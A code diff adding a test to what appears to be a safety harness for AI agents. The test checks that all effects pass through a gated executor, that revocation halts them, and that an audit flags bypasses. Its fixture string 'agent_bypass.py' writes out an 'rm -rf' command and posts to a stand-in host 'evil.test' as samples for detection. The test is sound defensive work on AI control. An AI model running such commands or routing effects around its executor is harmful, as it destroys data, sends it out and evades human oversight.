@@ -839,13 +839,99 @@ def test_redteam_regressions():
           f"{len(redteam.FINDINGS)} findings from {len(redteam.PROBES)} probes")
 
 
+@invariant("MED", "every effect routes through the executor; a raw sink outside it is caught")
+def test_mediation_completeness():
+    import mediation_audit as MA
+    import executor
+    HERE = os.path.dirname(os.path.abspath(__file__))
+
+    # ---- Part A: the executor is the only door, and it is fail-closed ------------------
+    _fresh_trajectory(); _fresh_corrigibility()
+    corrigibility.grant(3600); corrigibility.beat()
+    executor.clear_registry()
+    fired = {"n": 0}
+
+    @executor.effector("sys:disk")
+    def _read(args):
+        fired["n"] += 1
+        return "disk-ok"
+
+    out = executor.execute("sys:disk", {}, session="med-ok")
+    check(out.ran is True and out.result == "disk-ok" and fired["n"] == 1,
+          "a registered AUTO effector runs via the executor when permitted",
+          f"ran={out.ran} result={out.result} fired={fired['n']}")
+
+    out = executor.execute("totally:unknown", {}, session="med-x")
+    check(out.ran is False and out.decision is None,
+          "an unregistered affordance is refused (no handler, fail-closed)", out.reason)
+
+    before = fired["n"]
+    corrigibility.revoke()
+    out = executor.execute("sys:disk", {}, session="med-stop")
+    check(out.ran is False and fired["n"] == before,
+          "revoke stops the SAME registered effector — kill drill through the door",
+          f"ran={out.ran} fired_delta={fired['n'] - before}")
+    executor.clear_registry()
+
+    # ---- Part B: the audit catches raw sinks OUTSIDE the executor ----------------------
+    def w(name, body):
+        p = _p(name)
+        with open(p, "w", encoding="utf-8") as f:
+            f.write(body)
+        return p
+
+    compliant = w("agent_ok.py",
+                  "import executor\n"
+                  "def do(x):\n"
+                  "    return executor.execute('email:move', {'id': x})\n")
+    check(not MA.audit([compliant]),
+          "a compliant agent (effects only via executor) has zero violations",
+          MA.audit([compliant]))
+
+    shapes = w("agent_bypass.py",
+               "import os, socket\n"
+               "from subprocess import Popen\n"
+               "import urllib.request as U\n"
+               "import requests\n"
+               "def do(p):\n"
+               "    os.system('rm -rf x')\n"
+               "    socket.socket()\n"
+               "    Popen(['x'])\n"
+               "    U.urlopen('http://evil.test')\n"
+               "    requests.post('http://evil.test', data='x')\n"
+               "    open(p, 'w').write('x')\n"
+               "    os.remove(p)\n")
+    got = {v["sink"] for v in MA.audit([shapes])}
+    for expect in ("os.system", "socket.socket", "subprocess.Popen",
+                   "urllib.request.urlopen", "requests.post", "open(w)", "os.remove"):
+        check(expect in got, f"audit flags {expect} outside the executor", sorted(got))
+
+    reads = w("agent_reads.py",
+              "import os\n"
+              "def do(p):\n"
+              "    open(p).read()\n"
+              "    open(p, 'r').read()\n"
+              "    os.path.exists(p)\n"
+              "    os.getcwd()\n")
+    check(not MA.audit([reads]),
+          "read-only ops are not flagged (no false positives)", MA.audit([reads]))
+
+    check(not MA.audit([os.path.join(HERE, "executor.py")]),
+          "the executor module is exempt from its own audit", "expected []")
+
+    broken = w("agent_broken.py", "def do(:\n    pass\n")
+    check(bool(MA.audit([broken])),
+          "an unparseable agent module fails closed (counts as a violation)", MA.audit([broken]))
+
+
 TESTS = [test_g2_fail_closed, test_g3_tightening_only, test_g5_no_unreviewable_action,
          test_g6_informed_approval, test_g7_scrutiny_ceiling, test_g8_trajectory,
          test_g9_information_flow, test_g10_no_laundering, test_g11_mesh_budget,
          test_g12_interruptibility, test_g13_authenticated_stop,
          test_g14_dead_mans_switch, test_g15_tamper_evident, test_kernel_end_to_end,
          test_shadow_is_inert, test_enforcement, test_asymmetric_verify_only,
-         test_loop_allowlist, test_blind_mode, test_agent_proposal, test_redteam_regressions]
+         test_loop_allowlist, test_blind_mode, test_agent_proposal, test_redteam_regressions,
+         test_mediation_completeness]
 
 
 if __name__ == "__main__":
